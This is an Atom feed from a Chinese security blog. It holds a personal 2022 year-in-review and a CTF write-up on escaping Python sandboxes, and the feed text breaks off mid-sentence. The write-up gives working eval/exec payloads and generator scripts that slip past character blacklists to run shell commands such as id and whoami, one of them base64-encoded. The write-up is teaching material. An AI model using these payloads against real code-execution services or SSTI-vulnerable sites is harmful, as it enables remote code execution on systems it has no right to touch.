<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tr0y&#39;s Blog</title>
  
  <subtitle>与地球重修旧好</subtitle>
  <link href="https://www.tr0y.wang/atom.xml" rel="self"/>
  
  <link href="https://www.tr0y.wang/"/>
  <updated>2023-05-04T09:44:57.344Z</updated>
  <id>https://www.tr0y.wang/</id>
  
  <author>
    <name>Tr0y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2022 年度总结</title>
    <link href="https://www.tr0y.wang/2023/01/31/2022/"/>
    <id>https://www.tr0y.wang/2023/01/31/2022/</id>
    <published>2023-01-31T20:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.344Z</updated>
    
    <content type="html"><![CDATA[<p>年度总结，虽迟但到。</p><span id="more"></span><p>距离上一次发布文章，已经过去很久了，停更这么久的原因有很多，总结起来还是精力不足了。</p><p>其实我本来是准备在元旦发的，因为这是一篇年度总结。当时虽然有很多想说的，但是我没想好怎么写，多次打开编辑器，写了点字又删掉了，实在是没有思路。本来今天要赶高铁，早早上床休息了，不料却失眠了，但也正好有那个空闲和空间，能让我静静地想一些事情，趁着逻辑还算理顺了，在飞奔的高铁上，写下了这篇文章。</p><h2 id="事业">事业</h2><p>我把事业分为两大块，一个是正儿八经的工作，一个是业余时自我提升的投入——其实学习也算是为了赚更多的钱嘛。</p><p>下面是我今年相关的时间线：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">09</span>-<span class="hljs-number">28</span> Python 沙箱逃逸的通解探索之路<br><span class="hljs-number">09</span>-<span class="hljs-number">26</span> OrangeKiller CTF 第 <span class="hljs-number">3</span> 期<br><span class="hljs-number">08</span>-<span class="hljs-number">27</span> 网鼎杯初赛<br><span class="hljs-number">08</span>-<span class="hljs-number">11</span> 利用 vscode 打造后门门中门<br><span class="hljs-number">08</span>-<span class="hljs-number">05</span> SecMap - SSTI（Tornado）<br><span class="hljs-number">07</span>-<span class="hljs-number">30</span> 强网杯初赛<br><span class="hljs-number">07</span>-<span class="hljs-number">22</span> 虎符杯决赛<br><span class="hljs-regexp">//</span> <span class="hljs-number">25</span> Day<br><span class="hljs-number">06</span>-<span class="hljs-number">27</span> OrangeKiller CTF 第 <span class="hljs-number">2</span> 期题解<br><span class="hljs-number">06</span>-<span class="hljs-number">27</span> OrangeKiller CTF 第 <span class="hljs-number">2</span> 期<br><span class="hljs-regexp">//</span> <span class="hljs-number">21</span> Day<br><span class="hljs-number">06</span>-<span class="hljs-number">06</span> SecMap - 反序列化（PyYAML）<br><span class="hljs-number">05</span>-<span class="hljs-number">30</span> xsleaks wiki 中文版发布<br><span class="hljs-regexp">//</span> <span class="hljs-number">14</span> Day<br><span class="hljs-number">05</span>-<span class="hljs-number">16</span> SecMap - Flask<br><span class="hljs-regexp">//</span> <span class="hljs-number">17</span> Day<br><span class="hljs-number">04</span>-<span class="hljs-number">29</span> SecMap - SSTI（mako）<br><span class="hljs-regexp">//</span> <span class="hljs-number">16</span> Day<br><span class="hljs-number">04</span>-<span class="hljs-number">13</span> SecMap - SSTI（jinja2）<br><span class="hljs-regexp">//</span> <span class="hljs-number">25</span> Day<br><span class="hljs-number">03</span>-<span class="hljs-number">19</span> 虎符杯初赛<br><span class="hljs-regexp">//</span> <span class="hljs-number">21</span> Day<br><span class="hljs-number">02</span>-<span class="hljs-number">26</span> SUSCTF<br><span class="hljs-regexp">//</span> <span class="hljs-number">23</span> Day<br><span class="hljs-number">02</span>-<span class="hljs-number">03</span> SecMap - 反序列化（Python）<br><span class="hljs-regexp">//</span> <span class="hljs-number">23</span> Day<br><span class="hljs-number">01</span>-<span class="hljs-number">11</span> 利用 Cloudflare Partner 劫持域名<br></code></pre></td></tr></table></figure><p>看上去还是有很多空隙的时间被我浪费掉了，唉，实际上我是真的没有多余的精力了。</p><h3 id="工作">工作</h3><p>今年的工作压力其实是比较大的。今年我负责的内容扩大了很多，需要分离很多精力做其他安全项目的建设，主要是可信的建设。我们公司的安全建设思路，不仅是纵深防御，还是可信的逻辑。可信，最重要的一个做法就是白名单，不管是行为白名单也好，策略白名单也好，总之就是白名单。相比于传统的黑名单模式，这个模式的强度非常高。可以类比一下，你可以不让你的孩子做某些“坏事”，这是黑名单，但是“坏事”是列举不完的；如果是白名单呢，那就是你只允许你的孩子做某些事情，因为允许的事情是经过你评估的，所以通常是安全的。可惜，安全属于计算机领域的一个小小的分支，自然也没有银弹。白名单带来的问题也很明显，你怎么判断这个事，是“坏事”？这个是很复杂的，需要非常大量的经验，而且很容易出现误判，对于用户体验、效率以及安全的平衡是，是比较难以把握的。</p><p>一个通常的做法是看历史的情况来得出白名单，例如通过系统间的历史调用日志，来得出初步的白名单。但毕竟是“初步”，一旦发生误判，就会导致一些比较危险的稳定性问题。我今年经历过了好几次，A 系统调用 B 系统，但是 A 不在我的白名单里，原因有很多，比如是一个新的业务或者是非常低频的调用，我在日志里没观察到等等，大半夜起来应急。目前最高记录是凌晨 3 点被告警系统 call 醒，好在应急及时，没有出现问题。</p><p>如果橘友们对我们的可信纵深防御建设感兴趣，不妨了解一下我们的可信纵深防御白皮书，刚发布没多久，这个还是非常非常有学习价值的。</p><p>自从开始做可信建设，我的钉钉群就加爆了，有非常多的告警群，一开始我的精神很紧绷，每次那十来个群有群消息，我都会点进去看，生怕是自己的策略导致的；电脑不离身，除了上厕所这种实在带不了的，不管是周末，节假日，我都是背着电脑出门，有事情立马处理。我已经无数次在饭店里，在高铁上，在医院里处理工作了。渐渐的我的睡眠时间从 23 点推移到 1、2 点，原因就是有段时间这个点老有告警，我推测是有很多系统在 0 点执行当天的某些任务吧，比如 crontab 这种的，所以我索性多等一会再睡。</p><p>这只是其中的一个方面，其他的辛酸就不多说了。总之压力的确有点大。所以我没有额外的精力再去看其他的一些资料，更没有时间好好想想事情，写一些文章，周六周日也只想躺着。</p><p>好在今年的结果应该还不错，但是我们是还没谈绩效，所以今年具体是什么情况，也不得而知。大年三十晚上家人问我工作怎么样，怎么样？我也不知道怎么说，只好回答，“还可以”。</p><p>这部分目前看来，今年完成得还不错，值得一顿大餐奖励。</p><h3 id="学习">学习</h3><p>正如上面说的那样，我不再有很多时间和精力可以让我去研究一些事情，所以文章更新也就少了。</p><p>某一天我问我对象，我这么久没更新公众号了，是不是粉丝会想我。她说你可别感动自己了，谁在乎呢。想想的确是这样，我关注了很多公众号，但是谁没更新我也不是很在意。说起来也是怪事，我本来写这个公众号的目的就是为了交流，但是微信公众号又不给我评论功能（现在新的公众号都不会有评论功能），就很奇葩；另一个目的还是想让自己的文字能有更多的人看到，不过和其他公众号类似，我的公众号也有大量的“僵尸粉”，目前是 900 多个粉丝，但是文章能有 200 个阅读量就顶破天了。</p><p>年中的时候我突发奇想，我这个号，如果开个广告能赚多少钱呢？于是我把最底下的广告开通了（底部广告这个不会影响阅读体验，做测试比较合适），我算了一下，差不多一个浏览量是 0.01 或者 0.02，如果是触发点击的话...我就不知道了，因为压根没人点过...这么算起来，假设每篇按照 200 阅读量计算（假设每个人都读到最后，看到广告了），每次浏览按照 0.02 元算，那么我只需要连续 7 天都发篇文章（普通公众号一天只能发一篇文章），就可以在公司门口吃一份猪脚饭了（笑</p><p>所以我的观念还是和以前一样，我写文章主要不是为了赚钱（但是真有钱我也赚，可惜没有，所以我现在嘴很硬）。国内互联网的环境其实并不好，但即使是这样，在我大学期间，很多前辈们的文章帮了我很多很多，他们是我的无名之师，我的专业知识很大一部分都是网上看来的。所以我想，这份传承在我这不能断，希望我的文章也能够像他们一样，给别人解答疑问，帮助别人学习。至于后人会不会继续传承这份精神呢？随他们去吧，我又管不了，总之我们先做好自己嘛。</p><p>而且我本身也不喜欢宣传自己公众号，所以自然粉丝和阅读量增长地都比较缓慢。听上去很奇怪，号主自己都不宣传。原因是我感觉我的一些经验还是不太够，可能会误导一些人吧，所以我就一切随缘了。这么看，橘友们能发现我这个公众号，显然是需要一些本事的，虽然好像关注了也不一定能学到什么（笑</p><p>挺好的，我们还是继续随缘吧，有得说我就发，没得说也就不打扰大家了。这部分今年完成得还不错，随队参加的比赛结果也还可以，都进决赛了而且名次也比较靠前。工作压力很大还能抽时间学点东西，发一些文章出来，很不容易了，值得一顿大餐鼓励。</p><h2 id="生活">生活</h2><p>今年上半年，我的时间基本上都给了工作，忽略了好好生活，好好关心家人，对此我的对象相当有意见，她觉得那个时候的我不是工作狂就是在变成工作狂的路上。但是在上半年我觉得这简直就是胡言乱语。在下半年我终于意识到了这个问题，偶尔也会放空一下发发呆，通过一些方式缓解了。但是平衡事业和生活谈何容易呢，得到一些东西，总是意味着失去一些东西。处理人际关系，特别是亲密关系的人际关系，我感觉对我来说是有点难的。我爸妈对我完全是散养的，而且其实只管我的物质生活，对于精神世界基本上是没有怎么关注过的，小时候自由惯了，万事不求人，长大后也不太能关心别人，因为那些都是我自己做的，我会觉得其他人也一样自己消化了。</p><p>我时常在想，大家总说这个人事业有成，赚了很多钱，很成功，却少有人说这个人家庭美满，过的轻松自在，很成功。那我的标准是什么呢？我也不知道，的确没想清楚。这个可没有技术博客可以看（笑</p><p>其他的就是摄影了，今年拍了不少好看的照片，感觉自己的水平的确也有在提升，虽然这个并不是我拍摄的目的。我对于摄影，其实不太喜欢去学习一些知识，毕竟是爱好嘛，就是遵从内心，我觉得怎么舒服就怎么来。拿着相机，我总会感觉到平和，可能是终于找到了一个不用和别人争个高低的事情了吧。</p><p>这部分总得来说就是完成得一般般。庆幸的是，发现了很多问题，才让我有机会能够改正这些问题，走得慢总比没走要强，慢慢来。</p><p>为此我非常感谢我的对象，在生活上她教会了我很多。回想起我们之间的经历，能够在一起的确需要些运气。难怪我彩票总是中不了，原来是已经中过了（笑</p><h2 id="碎碎念">碎碎念</h2><p>今年过年回家最大的感受是觉得自己没以前能吃苦了。我在父母的摊位上一起照看了一天，他们非常累，凌晨 3 点起床，卖到晚上 19 点收摊，日复一日，年复一年。我的工作环境，相比于他们已经很好了，却整天觉得压力很大，想躺平，赚的钱又不是非常多，能足以这样任性。看看他们去年经历的事情，以及现在的状态，说实话挺羞愧的。</p><p>但是他们从来没说过我什么，我想做什么去就去做，别搞黄赌毒就行（大笑），这个是我爸的原话。可能有人会说每个人能够承受的压力阈值不同，你何必用他人的方式逼自己呢。这个道理我是懂，但是如果高中的时候我没有狠心对自己，现在可能，不知道，或许会很差吧。</p><p>昨晚失眠，想起一件好玩的事。高中的时候我经常在空间里发说说，“加油小尾巴，晚安小尾巴”，大家都在猜小尾巴是谁，还能是谁？我当时那么内向，没什么存在感，难道还能脱单不成（笑），所以当然是我自己。因为我当时成绩基本是垫底，不过也没倒数几名吧，所以是“小尾巴”。我感觉截止到目前，高中时期我是最拼的，准确地说是高二高三。当时很喜欢看励志的故事，现在大家叫鸡汤。很多人现在都很反感这个东西，但是它的确在那段时光里给了我很多勇气。后来高二高三逆袭，在普通班考得比重点班的人还好，生物更是整个年段都没有对手，现在想想当时真是给力啊。那个时候的确很莽，我也不知道读书有啥用，但就是要读，冲就完事了。现在长大了，对一些目标反而畏畏缩缩，这人真奇怪，不知道在怕什么。</p><p>跑题了。</p><p>好汉不提当年勇，希望今年能勇吧。</p><br><p style="text-align: center;"><font size="2px" color="gray">加油小尾巴们<br>晚安小尾巴们</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;年度总结，虽迟但到。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.tr0y.wang/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="计划" scheme="https://www.tr0y.wang/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>Python 沙箱逃逸的通解探索之路</title>
    <link href="https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/"/>
    <id>https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/</id>
    <published>2022-09-28T19:30:00.000Z</published>
    <updated>2023-05-04T09:44:57.356Z</updated>
    
    <content type="html"><![CDATA[<p>这篇其实有《OrangeKiller CTF 第 3 期》中所有需要的知识点，也算 wp 了。提前祝各位国庆快乐！</p><span id="more"></span><h2 id="说在前面">说在前面</h2><p>让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os。</p><p>其次，在大多数 Python 的 SSTI 中，沙箱逃逸中可以使用的手段，通常来说也可以用在 SSTI 里，至少也能起到一个重要的指导意义。</p><p>其实沙箱逃逸大部分知识点，在 19 年 5 月我就已经整理完发布出来了，在看本篇之前，建议再看下这篇复习一下：</p><p>https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/</p><p>那么为什么还有这篇呢？</p><p>正如《OrangeKiller CTF 第 3 期》中所说，在做这期题目的时引出了本文的探索。同时，本篇也作为 wp 公布下第三期中题目的解法。</p><h2 id="通解探索">通解探索</h2><p>一切还是要从这道题目开始。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/34a1cf65-ce14-433a-937f-4ae50941883a.png!blog" /></p><p>解释一下：构造出一个 CMD，这个 CMD 经过这个 <code>all</code> 的计算后结果必须为 <code>True</code>，且 <code>eval(CMD)</code> 需要可以在 os shell 里执行 <code>id</code>（其实就是实现 RCE 啦）。</p><h3 id="解法一">解法一</h3><p>从执行上下文看，我们要构造出的 <code>CMD</code> 显然是一个字符串，因为下面会进行 <code>eval</code>。那么这里就有第一个问题：如何构造出任意字符串？</p><p>因为上面的限制条件把 <code>"</code>、<code>'</code> 都干掉了，所以直觉上我们会选择用 <code>chr</code> + <code>+</code> 来拼接出字符串，但是 <code>+</code> 也被干掉了。</p><p>而由于 <code>,</code> 也被干掉了，所以虽然能调用函数，但是也只能传一个参数。并且 <code>.</code> 也被限制掉了，所以就算可以 <code>__import__</code> 也没法调用方法。</p><p>对 Python CTF 题比较熟悉的橘友，第一反应可能是用 <code>list</code>+<code>dict</code>：<code>list(dict(whoami=1))[0]</code>。这个 payload 还是比较好用的，但问题是，由于 <code>whoami</code> 作为参数名，无法携带一些特殊的字符，例如空格、引号、括号 等等，所以仅凭这个手法去构造的 exp，在实际的利用过程中不是非常实用。</p><p>所以需要寻找其他办法。经过一番寻找，我在内置的函数中发现了 <code>bytes()</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/98250afa-427f-4532-9fc1-3d19688efbb5.png!blog#width-zoom8" /></p><p>也就是说，这个函数可以接收一个可迭代对象，里面是 0-256 的整数，然后就会返回一个 bytes：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/bc29ce37-24cc-4fa7-8cb7-6eb89715283b.png!blog" /></p><p>由于 <code>range()</code> 是固定顺序的，无法得到我们要的任意字符串。那么接下来问题就变成了：如何构造包含任意序列的整数的可迭代对象？</p><p>如果能构造出 <code>[119, 104, 111, 97, 109, 105]</code> 这样的序列，那么就可以通过 <code>bytes()</code> 得到 <code>whoami</code>。由于不能使用 <code>,</code>，所以不能直接写一个列表或者集合之类的出来。</p><p>最先映入我脑海中的是列表推导式，因为可以通过 <code>if</code> 来从列表中捞需要的数据。那么问题是这个布尔表达式要怎么写呢？先思考一下：对于一个有序的列表，若想捞出任意排序的字符串，不但需要固定下来每个字符的位置，还需要保证固定位置是特定的字符，所以肯定需要两个条件组合，那么 payload 就呼之欲出了：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">In [<span class="hljs-number">1</span>]: <span class="hljs-built_in">bytes</span>([<br>    ...:     j <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)<br>    ...:     <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">119</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">104</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">111</span><br>    ...:     <span class="hljs-keyword">or</span> i == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">97</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">109</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">5</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">105</span><br>    ...: ])<br>Out[<span class="hljs-number">1</span>]: <span class="hljs-string">b&#x27;whoami&#x27;</span><br></code></pre></td></tr></table></figure><p>对应的构造脚本：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;eval(bytes([j for i in range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>) for j in range(256) if &quot;</span>+<span class="hljs-string">&quot; or &quot;</span>.join([<span class="hljs-string">f&quot;i==<span class="hljs-subst">&#123;i&#125;</span> and j==<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]))&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>还有一个空格的限制，这个姿势在 OrangeKiller CTF 的第二期已经说过了，用 <code>[]</code> 来替代。构造脚本：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;eval(bytes([[j][0]for(i)in[range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="hljs-string">&quot;]or[&quot;</span>.join([<span class="hljs-string">f&quot;i]==[<span class="hljs-subst">&#123;i&#125;</span>]and[j]==[<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]]))&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>如果额外限制了 <code>==</code>，那么还可以用 <code>in</code> 来代替：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;eval(bytes([[j][0]for(i)in[range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="hljs-string">&quot;]]or[&quot;</span>.join([<span class="hljs-string">f&quot;i]in[[<span class="hljs-subst">&#123;i&#125;</span>]]and[j]in[[<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]]]))&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>最后这个 exp 长这样：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/cd8ff966-db58-4924-9e1e-ce4e7f4748dd.png!blog" /></p><p>如果 <code>bytes</code> 之类的内置函数被禁用了，可以通过 Unicode 来绕过，这个技巧我们已经见得多了，就不多说了。</p><p>所以，这个 payload 在大多数情况下已经可以通用了。</p><h3 id="解法二">解法二</h3><p>解法一有一个比较大的问题是，<code>if</code> 是没办法用 Unicode 绕过的。假如被禁了那么就 GG 了。所以，在上面条件限制的基础上，我们把 if 干掉，看看能否找到解决办法。</p><p>经过一番思索，我给出的第二个答案是：模拟 import。</p><p>我们知道，import 可以认为是打开源码之后执行代码。那么我们可以手动模拟这个过程，也就是 <code>exec(open(...).read())</code>，从而引入所需的函数。</p><p>首先面临的问题是：如何知道库的绝对路径呢？对于部分题目来说，可能存在绝对路径泄露，但是这个并不通用，我不喜欢。其实 <code>__import__</code> 之后，返回的 module 经过 str 就会有绝对路径：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/37029d2b-cb60-49cb-a51e-275c8e67cae8.png!blog" /></p><p>所以就可以这样：<code>open(str(__import__("os"))[19:-2])</code>。</p><p>问题又来了，要想读出文件内容，通常我们会用 <code>.read()</code>，但是 <code>.</code> 已经被干掉了。好在，<code>open</code> 的返回值是 <code>_io.TextIOWrapper</code>，由于存在 <code>__iter__</code> 方法，所以我们可以把它当做是一个可迭代对象来迭代。也就是可以通过 <code>list(open(str(__import__("os"))[19:-2]))</code> 取出文件内容，这个效果等价与 <code>open(...).readlines()</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/958db08e-a6c6-4a5b-97d1-dbe9212f9aec.png!blog" /></p><p>那么问题又来了，这种形式的源码，<code>exec</code> 是没法执行的。由于存在各种限制，<code>join</code> 这种都不用想了。经过一番思索，我感觉还是得用到列表推导。思路是用一个二层循环，一层将列表里的字符串拆解出来，例如 <code>["ab", "cd"]</code> 转为 <code>["a", "b", "c", "d"]</code>；第二层将列表里的字符，转为 ASCII 码，然后再用 <code>bytes</code> 转为完整的字符串。</p><p>payload 如下（这里的缩进只是为了更好地理解，实际上是不需要的）：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">exec</span>(<br>    <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-built_in">ord</span>(j)<br>        <span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<br>            <span class="hljs-built_in">list</span>(<br>                <span class="hljs-built_in">open</span>(<br>                    <span class="hljs-built_in">str</span>(<br>                        <span class="hljs-built_in">__import__</span>(<br>                            <span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(os=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>                        )<br>                    )[<span class="hljs-number">19</span>:-<span class="hljs-number">2</span>]<br>                )<br>            )<br>        )<br>        <span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)<br>    ])<br>)<br></code></pre></td></tr></table></figure></p><p>至此，我们就可以在上下文中执行 <code>os.py</code> 里的所有函数了：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/af219641-daab-49d9-9ef7-fbe120561c67.png!blog#width-zoom6" /></p><p>由于上述载入函数和执行函数是分开执行的，不是很优雅，有办法合并成一句执行么？</p><p>首先分析一下，payload 必须在执行函数之前运行，所以可以通过 <code>[exec(...)][0][system("whoami")]</code> 来实现，需要注意的是，<code>system</code> 在运行成功的时候才会返回 <code>0</code>，一旦失败，返回的数字比较大，命令虽然已执行成功，但是整个 payload 的执行是会失败的，可能会遇到不必要的麻烦。并且，形如 <code>popen</code> 这种返回字符串的，也不宜这样利用。</p><p>更好的方式是用 <code>[str][bool(exec...)](list(popen("whoami")))</code></p><p>所以解法二的 payload 如下：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py">[<span class="hljs-built_in">str</span>][<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">exec</span>(<br>    <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-built_in">ord</span>(j)<br>        <span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<br>            <span class="hljs-built_in">list</span>(<br>                <span class="hljs-built_in">open</span>(<br>                    <span class="hljs-built_in">str</span>(<br>                        <span class="hljs-built_in">__import__</span>(<br>                            <span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(os=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>                        )<br>                    )[<span class="hljs-number">19</span>:-<span class="hljs-number">2</span>]<br>                )<br>            )<br>        )<br>        <span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)<br>    ])<br>))](<span class="hljs-built_in">list</span>(popen(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/53068e2a-1a60-474f-9ac5-28eb573706fa.png!blog#width-zoom6" /></p><p>当然，上面这个 payload，同样存在特殊字符无法构造的问题，执行 <code>whoami</code> 这种单一的命令是 ok 的，如果想要反弹个 shell 就没法搞了。</p><p>好在思路有了，只需要换一下库就行。<code>dict</code> 参数要求是合法的变量名，那么我们很容易想到 base64 里的字符大部分都是 <code>0-9a-zA-Z</code> 构成，还有特殊的字符 <code>=</code>、<code>/</code>、<code>+</code>。后面我们会挨个解决这三个字符的问题，先展示下 payload：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">[<span class="hljs-built_in">eval</span>][<br>    <span class="hljs-built_in">bool</span>(<br>        <span class="hljs-built_in">exec</span>(<br>            <span class="hljs-built_in">bytes</span>([<br>                <span class="hljs-built_in">ord</span>(j)<br>                <span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<br>                    <span class="hljs-built_in">list</span>(<br>                        <span class="hljs-built_in">open</span>(<br>                            <span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(base64=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))[<span class="hljs-number">23</span>:-<span class="hljs-number">2</span>]<br>                        )<br>                    )<br>                )[:-<span class="hljs-number">5</span>]<br>                <span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)<br>            ])<br>        )<br>    )<br>](<br>    b64decode(<br>        <span class="hljs-built_in">list</span>(<br>            <span class="hljs-built_in">dict</span>(X19pbXBvcnRfXygnb3MnKS5wb3BlbignaWQnKS5yZWFkKCkg=<span class="hljs-number">1</span>)<br>        )[<span class="hljs-number">0</span>]<br>    )<br>)<br></code></pre></td></tr></table></figure><p>包含的命令为：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/5e5021d1-f99e-4f19-aea1-0f3e7571bd7c.png!blog" /></p><p>更进一步，这个 payload 里除了 <code>eval</code>、<code>list</code>、<code>dict</code>、<code>for</code>、<code>in</code>、<code>数字</code> 之外其他常量/函数/关键字都不是必要的。都可以用 <code>eval</code> + 